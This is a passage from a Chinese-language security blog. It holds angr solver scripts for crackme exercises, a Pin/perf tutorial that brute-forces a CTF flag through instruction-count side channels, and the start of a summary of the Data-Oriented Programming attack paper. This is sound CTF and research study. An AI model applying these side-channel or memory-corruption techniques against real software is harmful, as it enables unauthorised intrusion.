class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是以字符串形式读入四个8字节的字符串，然后存到bss段上，所以越过scanf，并且在bss段上赋上符号数据即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    start_address = <span class="number">0x8048601</span></span><br><span class="line"></span><br><span class="line">    init_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">    passwords = [claripy.BVS(<span class="string">"password%d"</span> % i, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    passwords_address = [<span class="number">0xB368DA0</span>, <span class="number">0xB368DA8</span>, <span class="number">0xB368DB0</span>, <span class="number">0xB368DB8</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        init_state.memory.store(passwords_address[i], passwords[i])</span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find, avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solutions = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            solutions.append(solution_state.se.eval(</span><br><span class="line">                passwords[i], cast_to = bytes))</span><br><span class="line">        print(<span class="string">b" "</span>.join(solutions))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pfu-hao-hua-dui">符号化堆</span><a href="#pfu-hao-hua-dui" class="header-anchor">#</a></h3><ul><li><code>06_angr_symbolic_dynamic_memory</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buffer0 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  buffer1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer0, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer1, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%8s %8s"</span>, buffer0, buffer1, v6);</span><br></pre></td></tr></table></figure><p>在这里，<code>buffer0</code>和<code>buffer1</code>是<code>.bss</code>段的指针，在运行过程中申请了内存块，<code>scanf</code>读入的数据也是存在申请的内存块内的，所以需要自己符号化<code>malloc</code>的内存</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    start_address = <span class="number">0x8048699</span> </span><br><span class="line"></span><br><span class="line">    init_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">    password0 = claripy.BVS(<span class="string">'password0'</span>,<span class="number">64</span>)</span><br><span class="line">    password1 = claripy.BVS(<span class="string">'password1'</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    fake_heap_address0 = <span class="number">0xffffc93c</span></span><br><span class="line">    fake_heap_address1 = <span class="number">0xffffc94c</span></span><br><span class="line"></span><br><span class="line">    pointer_to_malloc_memory_address0 = <span class="number">0x8135468</span></span><br><span class="line">    pointer_to_malloc_memory_address1 = <span class="number">0x8135470</span></span><br><span class="line"></span><br><span class="line">    init_state.memory.store(pointer_to_malloc_memory_address0,fake_heap_address0,endness=project.arch.memory_endness)</span><br><span class="line">    init_state.memory.store(pointer_to_malloc_memory_address1,fake_heap_address1,endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(fake_heap_address0,password0)</span><br><span class="line">    init_state.memory.store(fake_heap_address1,password1)</span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find, avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        sulution0=solution_state.se.eval(password0,cast_to=bytes)</span><br><span class="line">        sulution1=solution_state.se.eval(password1,cast_to=bytes)</span><br><span class="line">        print(<span class="string">b" "</span>.join([sulution0,sulution1]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pfu-hao-hua-wen-jian">符号化文件</span><a href="#pfu-hao-hua-wen-jian" class="header-anchor">#</a></h3><ul><li><code>07_angr_symbolic_file</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%64s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">  ignore_me((<span class="keyword">int</span>)<span class="built_in">buffer</span>, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  fp = fopen(<span class="string">"JKOYZJZV.txt"</span>, <span class="string">"rb"</span>);</span><br><span class="line">  fread(<span class="built_in">buffer</span>, <span class="number">1u</span>, <span class="number">0x40</span>u, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  unlink(<span class="string">"JKOYZJZV.txt"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">134520992</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">0x804A0A0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(<span class="built_in">buffer</span>, <span class="string">"QAIIDABN"</span>, <span class="number">9u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里需要从文件读取内容，所以需要自己符号化文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line"></span><br><span class="line">    start_address = <span class="number">0x80488D6</span> </span><br><span class="line">    init_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">    </span><br><span class="line">    filename = <span class="string">"JKOYZJZV.txt"</span></span><br><span class="line">    symbolic_file_size_bytes = <span class="number">0x40</span></span><br><span class="line">    </span><br><span class="line">    password = claripy.BVS(<span class="string">'password'</span>, symbolic_file_size_bytes * <span class="number">8</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="comment">#file_options = 'r'</span></span><br><span class="line">    password_file = angr.storage.SimFile(filename, content=password,size = symbolic_file_size_bytes)</span><br><span class="line"></span><br><span class="line">    init_state.fs.insert(filename,password_file)</span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find, avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solution = solution_state.se.eval(password,cast_to=bytes)</span><br><span class="line">        print(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>pin/perf在CTF逆向中的应用</title>
    <url>/c61763eb.html</url>
    <content><![CDATA[<blockquote><p>在”深度优先“的学习过程中发现了pin这个工具，之前对于平坦化的程序只会用deflat脚本去平坦化，去不了就只能苦逼的硬调了，直到发现了pin这个工具，打开了侧信道的大门，然后也在搜学习资料的时候搜到了比较轻量的perf工具</p></blockquote><a id="more"></a><p>比较典型的题目有2019 DDCTF 的confused，这里主要拿自己出的一道题目讲一下用法。</p><h3><span id="pan-zhuang">安装</span><a href="#pan-zhuang" class="header-anchor">#</a></h3><h4><span id="ppin">pin</span><a href="#ppin" class="header-anchor">#</a></h4><p>下载地址：<a href="https://software.intel.com/content/www/us/en/develop/articles/pin-a-binary-instrumentation-tool-downloads.html" target="_blank" rel="noopener">https://software.intel.com/content/www/us/en/develop/articles/pin-a-binary-instrumentation-tool-downloads.html</a></p><p>下载对应系统的pin即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -c https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.13-98189-g60a6ef199-gcc-linux.tar.gz</span><br><span class="line">tar -xvf pin-3.13-98189-g60a6ef199-gcc-linux.tar.gz</span><br><span class="line">mv pin-3.13-98189-g60a6ef199-gcc-linux pin</span><br><span class="line">cd pin/source/tools/ManualExamples/</span><br><span class="line">make all TAEGET=intel64</span><br><span class="line">make all TAEGET=ia32</span><br></pre></td></tr></table></figure><h4><span id="pperf">perf</span><a href="#pperf" class="header-anchor">#</a></h4><p>ubuntu 16.04， 内核为4.4.0-177</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install linux-tools-common</span><br><span class="line">apt install linux-tools-4.4.0-177-generic</span><br><span class="line">apt install linux-cloud-tools-4.4.0-177-generic</span><br></pre></td></tr></table></figure><h3><span id="pshi-yong">使用</span><a href="#pshi-yong" class="header-anchor">#</a></h3><p>侧信道的攻击主要是根据程序执行的指令数目进行攻击，因此只演示指令计数的使用方法</p><h4><span id="ppin">pin</span><a href="#ppin" class="header-anchor">#</a></h4><p>pintools的使用为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">path&#x2F;to&#x2F;pin -t path&#x2F;to&#x2F;your&#x2F;pintool -- path&#x2F;to&#x2F;binary &lt;arg&gt;</span><br></pre></td></tr></table></figure><p>举例来说，在我这里使用pin如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;pin&#x2F;pin -t .&#x2F;pin&#x2F;source&#x2F;tools&#x2F;ManualExamples&#x2F;obj-intel64&#x2F;inscount0.so -- .&#x2F;Just_reverse_it</span><br><span class="line">Input your flag:</span><br><span class="line">12</span><br><span class="line">Sorry</span><br><span class="line">$ cat inscount.out</span><br><span class="line">Count 1941819</span><br></pre></td></tr></table></figure><p>这里的Count就是从程序开始执行到退出所执行的指令数目了</p><h4><span id="pperf">perf</span><a href="#pperf" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ perf stat -x : -e instructions:u .&#x2F;Just_reverse_it</span><br><span class="line">Input your flag:</span><br><span class="line">12</span><br><span class="line">Sorry</span><br><span class="line">1941433::instructions:u:1330133:100.00</span><br></pre></td></tr></table></figure><p>这里的1941433就是perf统计指令执行的指令数目了</p><h3><span id="pli-ti">例题</span><a href="#pli-ti" class="header-anchor">#</a></h3><p>二进制文件：<a href="https://github.com/ycdxsb/Challenges/blob/master/MyChallenges/Just_reverse_it/attachment/Just_reverse_it" target="_blank" rel="noopener">Just_reverse_it</a></p><p>题目是一道简单的虚拟机题，逻辑如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># data[i]&#x3D;0x12^data[i-1]^(input[i]-i)</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">    mov reg1,input[reg3]</span><br><span class="line">    dec reg1,reg3</span><br><span class="line">    xor reg2,reg1</span><br><span class="line">    mov reg1,0xCD</span><br><span class="line">    xor reg1,reg2</span><br><span class="line">    cmp reg1,data[i]</span><br><span class="line">    mov reg2,reg1</span><br><span class="line">    jz continue</span><br><span class="line">    return 0 </span><br><span class="line">continue:</span><br><span class="line">    inc reg3</span><br><span class="line">    cmp reg3,const</span><br><span class="line">    jb loop</span><br><span class="line">    return 1</span><br></pre></td></tr></table></figure><p>可以看到当其中一个字节输入错误后，就会立刻跳出，而输入正确就会进入下一个字节的运算和比较，因此正确和错误，执行的指令数的差别，就能让我们使用侧信道的攻击方法了。</p><h4><span id="ppin-exp">pin exp</span><a href="#ppin-exp" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runCmd</span><span class="params">(self, cmd)</span>:</span></span><br><span class="line">        res = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdin=subprocess.PIPE,</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        sout, serr = res.communicate()</span><br><span class="line">        <span class="keyword">return</span> res.returncode, sout, serr, res.pid</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initPin</span><span class="params">(self, cmd)</span>:</span></span><br><span class="line">        res = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdin=subprocess.PIPE,</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        self.res = res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pinWrite</span><span class="params">(self, input)</span>:</span></span><br><span class="line">        self.res.stdin.write(input)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pinRun</span><span class="params">(self)</span>:</span></span><br><span class="line">        sout, serr = self.res.communicate()</span><br><span class="line">        <span class="keyword">return</span> sout, serr</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"~/pin/pin -t ~/pin/source/tools/ManualExamples/obj-intel64/inscount0.so -- ./Just_reverse_it"</span></span><br><span class="line"></span><br><span class="line">shell = Shell()</span><br><span class="line"></span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chs=string.printable</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">    max_num = <span class="number">0</span></span><br><span class="line">    max_ch = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> chs:</span><br><span class="line">        tmp = s + ch +(<span class="number">48</span>-len(s)<span class="number">-1</span>)*<span class="string">'a'</span></span><br><span class="line">        shell.initPin(cmd)</span><br><span class="line">        shell.pinWrite(tmp)</span><br><span class="line">        sout,serr = shell.pinRun()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'inscount.out'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            count = f.readline().split(<span class="string">' '</span>)[<span class="number">1</span>]</span><br><span class="line">        count = int(count)</span><br><span class="line">        <span class="keyword">if</span>(count&gt;max_num):</span><br><span class="line">            max_num = count</span><br><span class="line">            max_ch = ch</span><br><span class="line">    s+=max_ch</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure><h4><span id="pperf-exp">perf exp</span><a href="#pperf-exp" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runCmd</span><span class="params">(self, cmd)</span>:</span></span><br><span class="line">        res = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdin=subprocess.PIPE,</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        sout, serr = res.communicate()</span><br><span class="line">        <span class="keyword">return</span> res.returncode, sout, serr, res.pid</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initPin</span><span class="params">(self, cmd)</span>:</span></span><br><span class="line">        res = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdin=subprocess.PIPE,</span><br><span class="line">                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        self.res = res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pinWrite</span><span class="params">(self, input)</span>:</span></span><br><span class="line">        self.res.stdin.write(input)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pinRun</span><span class="params">(self)</span>:</span></span><br><span class="line">        sout, serr = self.res.communicate()</span><br><span class="line">        <span class="keyword">return</span> sout, serr</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'perf stat -x : -e instructions:u ./Just_reverse_it'</span></span><br><span class="line"></span><br><span class="line">shell = Shell()</span><br><span class="line"></span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chs=string.printable</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">    max_num = <span class="number">0</span></span><br><span class="line">    max_ch = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> chs:</span><br><span class="line">        tmp = s + ch +(<span class="number">48</span>-len(s)<span class="number">-1</span>)*<span class="string">'a'</span></span><br><span class="line">        shell.initPin(cmd)</span><br><span class="line">        shell.pinWrite(tmp)</span><br><span class="line">        sout,serr = shell.pinRun()</span><br><span class="line">        sout = sout.split(<span class="string">'\n'</span>)[<span class="number">2</span>]</span><br><span class="line">        count = int(sout.split(<span class="string">'::'</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span>(count&gt;max_num):</span><br><span class="line">            max_num = count</span><br><span class="line">            max_ch = ch</span><br><span class="line">    s+=max_ch</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure><h3><span id="pzong-jie">总结</span><a href="#pzong-jie" class="header-anchor">#</a></h3><p>侧信道的好处在于只需要进行简单的分析，剩下的躺着拿flag就行了，但对于一些指令数目差距不大的题目，侧信道也并不是那么简单，需要自己找一下规律或者改写自己的pin工具。反正我现在碰到简单输入flag的逆向就想先侧一侧或者angr一下。</p><p>总之能用最好，不能用也不亏，花不了很多时间。</p><h3><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h3><ul><li><p><a href="https://m4x.fun/post/perf-in-ctf/" target="_blank" rel="noopener">https://m4x.fun/post/perf-in-ctf/</a></p></li><li><p><a href="http://m4x.fun/post/pin-in-ctf/" target="_blank" rel="noopener">http://m4x.fun/post/pin-in-ctf/</a></p></li><li><p><a href="https://blog.csdn.net/qq_33438733/article/details/81108186" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/81108186</a></p></li><li><p><a href="https://blog.csdn.net/qq_33438733/article/details/81137057" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/81137057</a></p></li><li><p><a href="http://brieflyx.me/2017/binary-analysis/intel-pin-intro/" target="_blank" rel="noopener">http://brieflyx.me/2017/binary-analysis/intel-pin-intro/</a></p></li></ul>]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Data-Oriented Programming: On the Expressiveness of Non-Control Data Attacks(S&amp;P 2016)</title>
    <url>/c30e365e.html</url>
    <content><![CDATA[<blockquote><p>根据控制流的攻击我们知道有ROP和JOP，分别利用包含ret和jmp的Gadgets进行攻击，劫持控制流。</p><p>非控制数据攻击通过攻击程序内存，达到信息泄露或者权限提升等目的。文中提出了DOP攻击，利用程序中的Gadgets，构造任意x86程序的非控制数据攻击，并且这种攻击是图灵完备的。</p></blockquote><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>控制流劫持攻击是目前主流的攻击，例如ROP及其变种，但对此人们也有很多防御措施：CFI、CCFI、CPI、TASR、ASLR、DEP等。</p><p>从程序的执行角度，我们可以想到程序是存在控制流和数据流的，而以上只能保证控制流部分的安全，对于数据流则无无能为力，所以非控制数据流攻击就成了额外的攻击方法，只要修改内存中的几个字节，就能达成攻击目的。</p><p><strong>本文方法</strong>：</p><ul><li>找DOP的gadgets——模拟图灵运算</li><li>找gadgets dispatcher——串联Gadgets</li></ul><p><strong>实验结果</strong>：</p><ul><li>9个程序中找到了7518个gadget和5092个gadgets dispatcher</li><li>其中8个程序能模拟任意计算，2个可以达成图灵完全攻击</li></ul><p>最后也实现了3种端到端的攻击，并且ASLR和DEP对攻击无作用。</p><h2><span id="pproblem">Problem</span><a href="#pproblem" class="header-anchor">#</a></h2><h3><span id="pbackground-non-control-data-attacks">Background: Non-control Data Attacks</span><a href="#pbackground-non-control-data-attacks" class="header-anchor">#</a></h3><p>通过直接攻击数据流来达到攻击目的，例如下图中，我们只要修改变量<code>pw-&gt;pw_uid</code>的值，就能达到提权的目的</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5sekdby9j30wq0c4407.jpg" alt="image-20200526132809230"></p><h3><span id="pexample-of-data-oriented-programming">Example of Data-oriented Programming</span><a href="#pexample-of-data-oriented-programming" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5sk2vs66j30j00bqgni.jpg" alt="image-20200526133329831"></p><p>能看懂啊line 7 存在溢出，因此buf溢出能控制局部变量(tyoe,size,connect_limie)，同时局部变量又能修改指针（line12，line13）这种就称为<code>data-oriented gadgets</code>，同时可以注意到它们都在while循环中，因此可以连续的利用，称为<code>gadget dispatchers</code></p><p>通过对上图中的DOP利用，能够更新Code3链表中的函数，并且这种攻击时满足CFG完整性的</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5sopvx5jj30j005odgq.jpg" alt="image-20200526133757036"></p><h3><span id="pquestions">Questions</span><a href="#pquestions" class="header-anchor">#</a></h3><ul><li>DOP gadgets和gadgets dispatcher存在普遍吗？</li><li>能否根据需要链式gadgets达到攻击，是否图灵完备？</li><li>能否突破当期的防御机制？</li></ul><h2><span id="pdata-oriented-programming">DATA-ORIENTED PROGRAMMING</span><a href="#pdata-oriented-programming" class="header-anchor">#</a></h2><h3><span id="pdop-overview">DOP Overview</span><a href="#pdop-overview" class="header-anchor">#</a></h3><p>DOP主要是模拟表达式计算，因此定义了如下DOP语言</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5strl02nj30ii09emyj.jpg" alt="image-20200526134248369"></p><p>包括六种虚拟指令，实现算术、逻辑、赋值、加载、存储、跳转、条件跳转等操作。</p><h3><span id="pdata-oriented-gadgets">Data-Oriented Gadgets</span><a href="#pdata-oriented-gadgets" class="header-anchor">#</a></h3><p>DOP的gadgets不能使用寄存器，使用内存来模拟寄存器。面向数据的gadgets模拟了三种micro-operation：加载，运算和写入。</p><p>DOP和ROP很像，他们的区别主要在于以下两点：</p><ol><li>DOP的gadgets只能使用内存来传递操作的结果，而ROP的gadgets可以使用寄存器。</li><li>DOP的gadgets必须符合控制流图（CFG），不能发生非法的控制流转移，而且无需一个接一个的执行。而ROP的gadgets必须成链，顺序执行。</li></ol><p><strong>模拟算数运算</strong>：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5t3wcjkpj30kg05ygmn.jpg" alt="image-20200526135232984"></p><p><strong>模拟赋值运算</strong>：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5t4dnwx8j30n8066my2.jpg" alt="image-20200526135300192"></p><p><strong>模拟加载，存储运算</strong>：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5t55au74j30ns08ojt0.jpg" alt="image-20200526135344429"></p><h3><span id="pgadgets-dispatcher">Gadgets Dispatcher</span><a href="#pgadgets-dispatcher" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf5ufmz55cj310a0goq6k.jpg" alt="image-20200526143825499"></p><p>Dispatcher用来对gadgets进行迭代调度，在每一轮迭代中选用不同的gadgets对上一轮的结果进行处理，为了将第i次迭代的输出和第 i+1 次迭代的输入对应，gadgets将第 i+1 的加载地址设置为第 i 